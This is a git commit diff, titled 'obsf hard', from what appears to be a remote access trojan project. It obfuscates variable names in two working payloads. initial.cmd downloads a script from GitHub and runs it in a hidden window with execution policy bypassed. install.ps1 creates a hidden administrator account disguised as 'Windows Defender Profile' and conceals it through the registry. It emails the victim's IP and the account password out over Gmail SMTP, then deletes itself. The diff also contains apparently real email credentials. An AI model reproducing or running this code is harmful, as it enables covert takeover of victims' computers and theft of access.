b3ebdd662380e48532a999bbc920a72bf3eea88f
Soumyo001 <www.soumyo@gmail.com>
2025-01-23 10:53:31 -0800

    obsf hard

--- payloads/initial.cmd
+++ payloads/initial.cmd
@@ -4,22 +4,22 @@
 
 set MLrZWNKzXe="defalttests@gmail.com"
 set JKgSYUywNCvkasmW="nkos qxgo yxvo brmr"
-set InitialPath=%cd%
-set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
+set CLXduxKZAneOtWBob=%cd%
+set hOEiKdgQksaVGwf=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 
 @rem go to startup
-cd %StartupDir%
+cd %hOEiKdgQksaVGwf%
 echo %MLrZWNKzXe%>KHPWMpTitfZ.txt
 echo %JKgSYUywNCvkasmW%>oSyEZsgTWIU.txt
 
 @rem Download payload
-powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"
+powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wLMZNyTDPjiugBO.cmd'"
 
 @rem run the payload
-powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"
+powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wLMZNyTDPjiugBO.cmd"
 
 @rem move back to saved directory
-cd %InitialPath%
+cd %CLXduxKZAneOtWBob%
 
 @REM del initial.cmd
 
--- payloads/install.ps1
+++ payloads/install.ps1
@@ -1,71 +1,71 @@
-function random_text($len){
-    return -join ((65..90) + (97..122)|Get-Random -Count $len|%{[char]$_})
+function mfRCoqywZDeQlL($mNHDTfYFzXUeZn){
+    return -join ((65..90) + (97..122)|Get-Random -Count $mNHDTfYFzXUeZn|%{[char]$_})
 }
 
 # Create local admin for the rat
-function create_account {
+function hqTnJbKVSsMrZgXw {
     [CmdletBinding()]
     param (
-        [string] $xf061name,
-        [securestring] $xf061pass
+        [string] $vWrPkQSpYZtOb,
+        [securestring] $WSUcYXCfOldphPx
     )    
     begin {
     }    
     process {
-        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Windows Defender Profile" # can remove description parameter if want
-        # Write-Verbose "$xf061name local user crated"
-        Add-LocalGroupMember -Group "Administrators" -Member "$xf061name"
-        # Write-Verbose "$xf061name added to the local administrator group"
+        New-LocalUser "$vWrPkQSpYZtOb" -Password $WSUcYXCfOldphPx -FullName "$vWrPkQSpYZtOb" -Description "Windows Defender Profile" # can remove description parameter if want
+        # Write-Verbose "$vWrPkQSpYZtOb local user crated"
+        Add-LocalGroupMember -Group "Administrators" -Member "$vWrPkQSpYZtOb"
+        # Write-Verbose "$vWrPkQSpYZtOb added to the local administrator group"
     }    
     end {
     }
 }
 # create admin user
-$xf061name = "onlyrat"
-$xf061RandPass = random_text(Get-Random -Minimum 6 -Maximum 19)
-Remove-LocalUser -Name "$xf061name"
-$xf061pass = (ConvertTo-SecureString $xf061RandPass -AsPlainText -Force)
-create_account -xf061name $xf061name -xf061pass $xf061pass
+$NzSqmkZnFQcBf = "onlyrat"
+$OIRXhsDHFU = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 19)
+Remove-LocalUser -Name "$NzSqmkZnFQcBf"
+$blZqsekcOWhwU = (ConvertTo-SecureString $OIRXhsDHFU -AsPlainText -Force)
+hqTnJbKVSsMrZgXw -vWrPkQSpYZtOb $NzSqmkZnFQcBf -WSUcYXCfOldphPx $blZqsekcOWhwU
 # registry
 New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name SpecialAccounts -Force
 New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $xf061name -Value 0 -Type DWORD -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $NzSqmkZnFQcBf -Value 0 -Type DWORD -Force
 
 # Variables
-$directory = random_text(5)
-$temp_dir = "$env:TEMP\$directory"
+$EubGKxeoVHdWnNIr = mfRCoqywZDeQlL(5)
+$rkeuRmdqpyEPQG = "$env:TEMP\$EubGKxeoVHdWnNIr"
 # save current directory
-$curr_dir = Get-Location|%{$_.Path}
+$fXmtFxsAMdGw = Get-Location|%{$_.Path}
 
-$email = Get-Content .\KHPWMpTitfZ.txt
-$password = Get-Content .\oSyEZsgTWIU.txt
-$config_file = "$env:username.rat"
-$ip = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
+$QLxOhYDbSkv = Get-Content .\KHPWMpTitfZ.txt
+$MQKWAnzsGSxJ = Get-Content .\oSyEZsgTWIU.txt
+$rtsRfiZBxpGP = "$env:username.rat"
+$LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
 # generate config file
-Add-Content -Path $config_file -Value $ip               #ip
-Add-Content -Path $config_file -Value $xf061RandPass    #pass
-Add-Content -Path $config_file -Value $temp_dir         #working dir
-Add-Content -Path $config_file -Value $curr_dir         #startup dir
+Add-Content -Path $rtsRfiZBxpGP -Value $LcghRQwiJbdINVyFY   #ip
+Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
+Add-Content -Path $rtsRfiZBxpGP -Value $rkeuRmdqpyEPQG      #working dir
+Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
 # Send Initial reconnaissance
-powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $email -to $email -subject $config_file -attachments $config_file -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $email ,(convertto-securestring -string '$password' -asplaintext -force))}"
+powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $QLxOhYDbSkv -to $QLxOhYDbSkv -subject $rtsRfiZBxpGP -attachments $rtsRfiZBxpGP -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $QLxOhYDbSkv ,(convertto-securestring -string '$MQKWAnzsGSxJ' -asplaintext -force))}"
 
 # cleanup your credentials and reconnaissance files
 Remove-Item .\KHPWMpTitfZ.txt -Force
 Remove-Item .\oSyEZsgTWIU.txt -Force
-Remove-Item .\$config_file -Force
+Remove-Item .\$rtsRfiZBxpGP -Force
 
 
 # goto temp and make working directory
-mkdir $temp_dir
-cd $temp_dir
+mkdir $rkeuRmdqpyEPQG
+cd $rkeuRmdqpyEPQG
 
 # Download registry to hide local admin
-# $reg_file = random_text(Get-Random -Minimum 6 -Maximum 13)
+# $reg_file = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 13)
 # iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/admin.reg" -OutFile ".\$reg_file.reg"
 
 # Download VbScript file which will automate our registry entry
-# $vbs_file = random_text(Get-Random -Minimum 6 -Maximum 13)
+# $vbs_file = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 13)
 # iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/confirm.vbs" -OutFile ".\$vbs_file.vbs"
 
 # enable persistent ssh
@@ -92,5 +92,5 @@ cd C:\Users
 attrib +h +s +r ".\onlyrat"
 
 # navigate to the saved directory and self delete
-cd $curr_dir
-del install.ps1
+cd $fXmtFxsAMdGw
+del OVlqumatcNr.ps1
